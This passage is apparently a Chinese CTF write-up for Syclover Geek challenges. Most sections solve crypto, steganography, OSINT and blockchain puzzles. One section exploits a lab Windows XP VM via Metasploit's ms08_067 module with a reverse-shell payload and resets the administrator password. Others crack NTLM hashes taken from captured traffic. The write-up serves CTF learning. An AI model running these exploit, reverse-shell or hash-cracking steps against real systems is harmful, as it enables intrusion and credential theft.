</p><h3 id="ext-7gcd"><a href="#ext-7gcd" class="headerlink" title="ext^7gcd"></a>ext^7gcd</h3><blockquote><p>题目链接：nc 59.110.20.54:1789 （下sagemath! 不下的统统发配到安东星当嘿奴！）</p></blockquote><p>分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a1*p1+a2*p2=1</span><br><span class="line">a3*p3+a4*p4=1</span><br><span class="line">a5*p5+a6*p6=1</span><br><span class="line">a0*p0+a*(a1*p1+a2*p2+a3*p3+a4*p4+a5*p5+a6*p6)=a0*p0+a*3=1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">1789</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xgcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    prevx, x = <span class="number">1</span>, <span class="number">0</span>;  prevy, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, prevx = prevx - q*x, x  </span><br><span class="line">        y, prevy = prevy - q*y, y</span><br><span class="line">        a, b = b, r</span><br><span class="line">    <span class="keyword">return</span> a, prevx, prevy</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">    p = <span class="built_in">eval</span>(<span class="string">b&#x27;[&#x27;</span>+r.recvuntil(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">    _,a1,a2 = xgcd(p[<span class="number">1</span>],p[<span class="number">2</span>])</span><br><span class="line">    _,a3,a4 = xgcd(p[<span class="number">3</span>],p[<span class="number">4</span>])</span><br><span class="line">    _,a5,a6 = xgcd(p[<span class="number">5</span>],p[<span class="number">6</span>])</span><br><span class="line">    _,a0,a = xgcd(p[<span class="number">0</span>],<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;a6: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;<span class="subst">&#123;a0&#125;</span>,<span class="subst">&#123;a*a1&#125;</span>,<span class="subst">&#123;a*a2&#125;</span>,<span class="subst">&#123;a*a3&#125;</span>,<span class="subst">&#123;a*a4&#125;</span>,<span class="subst">&#123;a*a5&#125;</span>,<span class="subst">&#123;a*a6&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;N0t_s0_e4sy_3xtgCd&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><blockquote><p>Recently jrl888 has learned something about groebner_basis.But could U plz help him to sovle his linear algebra homework?</p></blockquote><p>矩阵 <code>1*32 * 32*16 = 1*16</code>，构造格规约：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">76231309481023608274751321361920497941621991893430257210800219032855778863403</span></span><br><span class="line">M = [...]</span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, <span class="number">32</span>,<span class="number">16</span>, M)</span><br><span class="line">I = identity_matrix(<span class="number">32</span>)</span><br><span class="line">P = p * identity_matrix(<span class="number">16</span>)</span><br><span class="line">C = matrix(ZZ, c)</span><br><span class="line">Z1 = zero_matrix(<span class="number">16</span>,<span class="number">32</span>)</span><br><span class="line">Z2 = zero_matrix(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line">L = block_matrix(ZZ,[[M,I],[P,Z1],[C,Z2]])</span><br><span class="line">B = L.LLL()</span><br><span class="line">key = <span class="built_in">list</span>(-B[<span class="number">1</span>][<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24]</span></span><br></pre></td></tr></table></figure><p>再根据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1^e0%p=c0</span><br><span class="line">x2^e1%p=c1</span><br><span class="line">x3^e2%p=c2</span><br><span class="line">x1+x2+x3=s</span><br><span class="line">GB基解</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">241</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">209</span>, <span class="number">141</span>, <span class="number">236</span>, <span class="number">196</span>, <span class="number">125</span>, <span class="number">153</span>, <span class="number">121</span>, <span class="number">243</span>, <span class="number">104</span>, <span class="number">157</span>, <span class="number">250</span>, <span class="number">164</span>, <span class="number">197</span>, <span class="number">241</span>, <span class="number">85</span>, <span class="number">184</span>, <span class="number">247</span>, <span class="number">145</span>, <span class="number">27</span>, <span class="number">128</span>, <span class="number">184</span>, <span class="number">203</span>, <span class="number">233</span>, <span class="number">104</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">12</span>, <span class="number">24</span>]</span><br><span class="line">key = <span class="built_in">int</span>(<span class="built_in">bytes</span>(key).<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c = [<span class="number">5415723658972576382153559473862560277755192970021711034483296770242757614573901416501357332661976379693731699836578087114136761491831672836130172409491889</span>, <span class="number">210713951733721296094981135225517096332793112439184310028590576805069783972692891743044656754643189870169698041576462365740899368554671164493356650858567594970345928936103914826926922045852943068526737627918609421198466329605091625</span>, <span class="number">93558120697660628972553751937347865465963385519812302371069578286123647411810258547153399045605149278436900736665388355004346922404097196048139360206875149390218160164739477798859206611473675859708579299466581718543909912951088772842957187413726251892347470983848602814387339449340072310561011153714207338630</span>]</span><br><span class="line">p = <span class="number">175336555462486363373099551411803174933803940918372428249159666803182759268063415863987676455854054651631174131625763475189413468427467197699058719725221879406119373683175842618465694427132003565774900609456204965408254598477034791500576573579131820364396996254469692964946065509325801687720344376041097328929</span></span><br><span class="line">s = <span class="number">192597139210277682598060185912821582569043452465684540030278464832244948354365</span></span><br><span class="line"></span><br><span class="line">P.&lt;i&gt; = PolynomialRing(ZZ)</span><br><span class="line">f = i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span></span><br><span class="line">res = f.roots()</span><br><span class="line">e = [k[<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> res]</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2,x3&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f1 = x1^e[<span class="number">2</span>]-c[<span class="number">0</span>]</span><br><span class="line">f2 = x2^e[<span class="number">1</span>]-c[<span class="number">1</span>]</span><br><span class="line">f3 = x3^e[<span class="number">0</span>]-c[<span class="number">2</span>]</span><br><span class="line">f4 = x1+x2+x3-s</span><br><span class="line">G = Ideal([f1, f2, f3, f4]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi^^key)[<span class="number">2</span>:]))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;You_are_SYC&#123;You_are_SYC&#123;You_&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;really_algebreally_algebreally_a&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;ra_master&#125;\x02\x02ra_master&#125;\x02\x02ra_maste&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;You_are_really_algebra_master&#125;</code>。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="cheekin"><a href="#cheekin" class="headerlink" title="cheekin"></a>cheekin</h3><blockquote><p>请前往”三叶草小组Syclover”微信公众号输入flag获得flag</p></blockquote><p>发送flag，下载图片，zsteg的b1,rgb,lsb,xy通道有 <code>syc&#123;s4y_he110_t0_syclover&#125;</code>。</p><p>​    </p><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><blockquote><p>游戏通关即可得到flag内容，需要自行添加<code>SYC&#123;&#125;</code>包含。例: flag内容为 haha_haha 则最终flag为 SYC{haha_haha} 题目链接：<a href="https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek">https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek</a> hint: data.win</p></blockquote><p>使用<a href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a>工具解包data.win，在string窗口找到：<code>c20xbGVfMXNfQF9uMWNlX2dAbWU=</code>，base64解码：<code>sm1le_1s_@_n1ce_g@me</code>。</p><p>flag：<code>SYC&#123;sm1le_1s_@_n1ce_g@me&#125;</code></p><p>​    </p><h3 id="DEATH-N0TE"><a href="#DEATH-N0TE" class="headerlink" title="DEATH_N0TE"></a>DEATH_N0TE</h3><blockquote><p>“o2takuXX突然失踪了，你作为他的好朋友，决定去他的房间看看是否留下了什么线索…”。前置剧情题，flag有两段，隐写的信息有点多记得给信息拿全。 hint1: Stegsolve lsb hint2: 图片大小和像素点</p></blockquote><p>png图片末尾提取出：</p><p><code>IuS9oOaJvuWIsOS6huS4gOacrOOAikRFQVRIIE5PVEXjgIvvvIzlpb3lpYflv4PpqbHkvb/kvaDnv7vlvIDov5nmnKznrJTorrDvvIzkvaDpmIXor7vkuobkvb/nlKjop4TliJnvvIzkvYbmmK/kvaDmg4rorrblnLDlj5HnjrDliJrmiY3nmoTop4TliJnkuYvkuK3llK/ni6zmsqHmnInnrKwxMOadoS4uLiIKIuS9oOWGjeasoeWOu+ehruiupOaYr+WQpuWmguatpO+8jOeslOiusOS4iueahOaWh+Wtl+WNtOS7v+S9m+a0u+S6hui1t+adpe+8jOWcqOS9oOecvOS4reS4jeaWreWcsOaUvuWkp+e8qeWwj++8jOS9oOmXreS4iuS6huWPjOecvC4uLiIKIuWOn+acrOm7keiJsueahOaWh+Wtl+S4gOi9rOWPmOaIkOihgOe6ouiJsu+8jOivoeW8gueahOeUu+mdoui/mOaYr+WHuueOsOS6juS9oOeahOinhue9keiGnOWJje+8jOS9oOWGs+WumuS4jeWGjee6oOe7k+S6jumBl+WkseeahOinhOWIme+8jOW5u+iniea2iOWkseS6hi4uLiI=</code></p><p>base64解码：</p><p><code>&quot;你找到了一本《DEATH NOTE》，好奇心驱使你翻开这本笔记，你阅读了使用规则，但是你惊讶地发现刚才的规则之中唯独没有第10条...&quot;&quot;你再次去确认是否如此，笔记上的文字却仿佛活了起来，在你眼中不断地放大缩小，你闭上了双眼...&quot;&quot;原本黑色的文字一转变成血红色，诡异的画面还是出现于你的视网膜前，你决定不再纠结于遗失的规则，幻觉消失了...&quot;</code></p><p>没什么用，zsteg 在 b1,rgb,lsb,xy 通道提取出：</p><p><code>IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</code></p><p>base64解码：</p><p><code>&quot;你继续观察手上漆黑色的笔记本，冷静下来的你发现了藏在封面最下边的一行小字:SYC&#123;D4@Th_N0t4_&quot;&quot;你浏览过整个笔记本，可惜全是空白页，其中有一页不知道被谁撕掉了，你最终还是翻到了缺失的那一页&quot;&quot;你用铅笔涂抹着后面一页，上面缓缓出现了遗失的痕迹...&quot;</code></p><p>得到flag前半段：<code>SYC&#123;D4@Th_N0t4_</code>。</p><p>放大图片，可发现白色像素点，结合题目查找为<a href="https://www.fonts.net.cn/font-17419261686.html">死亡笔记字体</a>，字符串：<code>TkFNRV9vMnRha3VYWH0</code></p><p>base64解码得到flag后半段：<code>NAME_o2takuXX&#125;</code>。</p><p>flag：<code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></p><p>​    </p><h3 id="下一站是哪儿呢"><a href="#下一站是哪儿呢" class="headerlink" title="下一站是哪儿呢"></a>下一站是哪儿呢</h3><blockquote><p>我和yxx去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？  flag格式：SYC{航班号_城市拼音}，城市拼音首字母大写噢</p></blockquote><p>查询 <code>有白色钢琴的机场</code>，配合百度以图搜图功能，查找到地点为：<code>深圳宝安国际机场</code>。</p><p>从1.jpg提取出zip压缩包，得到secret.png，为Standard Galactic Alphabet字体，利用<a href="https://www.dcode.fr/standard-galactic-alphabet">在线网站</a>解出信息为：<code>I WANT TO GO TO LIQUOR CITY</code>。</p><p>LIQUOR CITY=酒城=泸州市，城市拼音：<code>Luzhou</code>。</p><p>根据图片信息：时间8.25 20:19 马上起飞，在<a href="https://www.flightstats.com/v2/flight-tracker/route/SZX/LZO/?year=2023&amp;month=10&amp;date=24&amp;hour=18">flightstats</a>上查询深圳-泸州的航班号为：<code>CZ8579</code>。</p><p>flag：<code>SYC&#123;CZ8579_Luzhou&#125;</code></p><p>​    </p><h3 id="Qingwan心都要碎了"><a href="#Qingwan心都要碎了" class="headerlink" title="Qingwan心都要碎了"></a>Qingwan心都要碎了</h3><blockquote><p>Qingwan和Yxx一起去旅游，但是Qingwan睡的太死啦，Yxx丢下她一个人去玩了，她一觉起来只看见Yxx发的朋友圈，能帮Qingwan找到她吗？ flag格式：SYC{地点名字}</p></blockquote><p>百度，以图搜图。</p><p><code>SYC&#123;重庆中国三峡博物馆&#125;</code></p><p>​    </p><h3 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h3><blockquote><p>Qrcode can deliver binary msg</p></blockquote><p>png分离得到两张png图片，按像素值异或操作即得到新二维码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000000.png&#x27;</span>)</span><br><span class="line">img2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;00000001.png&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(img1.size)</span><br><span class="line"><span class="built_in">print</span>(img2.size)</span><br><span class="line">width , height = img2.size</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width , height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        x1 = <span class="number">1</span> <span class="keyword">if</span> img1.getpixel((<span class="number">3</span>*i,<span class="number">3</span>*j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x2 = <span class="number">1</span> <span class="keyword">if</span> img2.getpixel((i,j)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        x = x1^x2</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;new.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;hOp3_u_h@ve_Fun&#125;</code></p><p>​    </p><h3 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h3><blockquote><p>“你看见了《DEATH NOTE》上面的名字，这时，Arahat0给你传了两个文件，并留言:” “[他拥有死神之眼，请小心，他在找你，还剩1920秒…]” “&lt;当前时间 10:52&gt;”。flag有两段</p></blockquote><p>webp文件在线转gif，使用gifsplitter拆分为880张图片。</p><p>猜测宽高为 <code>40*22</code>，合并：<code>montage *.bmp -tile 40x22 -geometry +0+0 ../out.png</code></p><p>拼图：<code>gaps --image=out.png --size=48 --save</code></p><p>得到文字：<code>XzE0X0tpMTE0Un0==</code>，base64解码得flag后半段：<code>_14_Ki114R&#125;</code>。</p><p>mp3文件提取SSTV信息：<code>sstv -d L1.wav -o 1.png</code></p><p>得到的图片里的文字为flag前半段：<code>SYC&#123;H4xr0t0r</code>。</p><p>flag：<code>SYC&#123;H4xr0t0r_14_Ki114R&#125;</code></p><p>​    </p><h3 id="窃听风云"><a href="#窃听风云" class="headerlink" title="窃听风云"></a>窃听风云</h3><blockquote><p>Hacker捕获到了一段敌对公司的对话信息流量，你能从流量中分析出Jack的密码吗，flag为SYC{password}</p></blockquote><p>NTLMSSP流量，利用提取工具 <a href="https://github.com/sinnaj-r/NTLMssp-Extract/blob/master/ntlmssp_extract.py">ntlmssp_extract</a> 提取NTLM得：</p><p><code>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</code></p><p>保存为hash文件，再用john解：</p><p><code>john hash --wordlist=rockyou.txt</code></p><p>结果：<code>iamjackspassword (jack)</code></p><p>flag：<code>SYC&#123;iamjackspassword&#125;</code></p><p>​    </p><h3 id="extractMe"><a href="#extractMe" class="headerlink" title="extractMe"></a>extractMe</h3><blockquote><p>Try to extract me!</p></blockquote><p>4字节CRC32爆破，利用<a href="https://github.com/theonlypwner/crc32">CRC32 Tools</a>分别爆破8段字符串：</p><p><code>python crc32.py reverse 0xXXXXXXXX</code></p><p>拼接得flag：<code>SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</code></p><p>​    </p><h3 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h3><blockquote><p>2001年的大屁股电脑，到了2023年会被揍得多惨呢？ 链接: <a href="https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek">https://pan.baidu.com/s/1GuvryuThIMn_fzhstWaKBA?pwd=geek</a> 提取码: geek</p></blockquote><p>WinXP虚拟机，用VMWare加载但无登录密码。</p><p>参考：<a href="https://blog.csdn.net/fengzilin1973/article/details/115967231">使用MSF 利用 ms08_067 对 XP 进行渗透</a></p><p>先对网段扫描IP：<code>nmap -sC -sV 192.168.79.0/24</code></p><p>得到IP后，使用MSF攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms08_067</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show payloads</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.79.132</span><br><span class="line">RHOST =&gt; 192.168.79.132</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LPORT 4444 </span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.79.128</span><br><span class="line">LHOST =&gt; 192.168.79.128</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; run</span><br></pre></td></tr></table></figure><p>getshell之后，使用net命令修改administrator密码：</p><p><code>net user administrator 123456</code></p><p>进入系统，桌面背景图得flag：<code>SYC&#123;You_defeated_me_after_22_years&#125;</code>。</p><p>​    </p><h3 id="SimpleConnect"><a href="#SimpleConnect" class="headerlink" title="SimpleConnect"></a>SimpleConnect</h3><blockquote><p>Just so so 属于blockchain 题目链接：<a href="http://47.109.106.62:1234/">http://47.109.106.62:1234/</a></p></blockquote><p>用Remix编译后，执行 <code>airdrop()</code> 函数，即满足 <code>isSolved()</code> 条件，</p><p>得到flag：<code>SYC&#123;kajd_u_iaak___hdskj_a&#125;</code>。</p><p>​    </p><h3 id="give-me-Goerlieth"><a href="#give-me-Goerlieth" class="headerlink" title="give_me_Goerlieth"></a>give_me_Goerlieth</h3><blockquote><p>Great  属于blockchain 题目链接：<a href="http://47.109.106.62:1235/">http://47.109.106.62:1235/</a></p></blockquote><p>转账即可。</p><p>​    </p><h3 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH_N2TE"></a>DEATH_N2TE</h3><blockquote><p>“你知道了真相，正带上《DEATH NOTE》准备逃离，恰好，Muscial发给你一个视频，并说:” “[这里记下了他的真名以及照片，请写在那本笔记上面，我和Arahat0都被他看见了真名…]”。</p></blockquote><p>mp4分帧：<code>ffmpeg -i kira.mp4 %05d.png</code></p><p>提取每一帧的列，组合：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">width,height = <span class="number">192</span>,<span class="number">108</span></span><br><span class="line">img_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&#x27;x/<span class="subst">&#123;<span class="built_in">str</span>(i+<span class="number">1</span>).zfill(<span class="number">5</span>)&#125;</span>.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            tmp = img.getpixel((i*<span class="number">10</span>+start,j*<span class="number">10</span>+start))</span><br><span class="line">            img_new.putpixel((i,j),tmp)</span><br><span class="line"></span><br><span class="line">    img_new.save(<span class="string">f&#x27;x/out_with_start_<span class="subst">&#123;start&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>start=5的时候，得flag：<code>SYC&#123;we1c0m4_T0_De@tH_W0r1d&#125;</code>。</p><p>​    </p><h3 id="窃听风云-V2"><a href="#窃听风云-V2" class="headerlink" title="窃听风云-V2"></a>窃听风云-V2</h3><blockquote><p>这次Hacker捕获到了Jack登录邮件系统的流量，你还能从流量中分析出Jack的密码吗，flag为SYC{password}</p></blockquote><p>SMTP流量，wireshark 解析ntlmssp，按照</p><p><a href="https://www.youtube.com/watch?v=mu7-naA0muc">Extracting NTLM Hash Values from a Wireshark packet 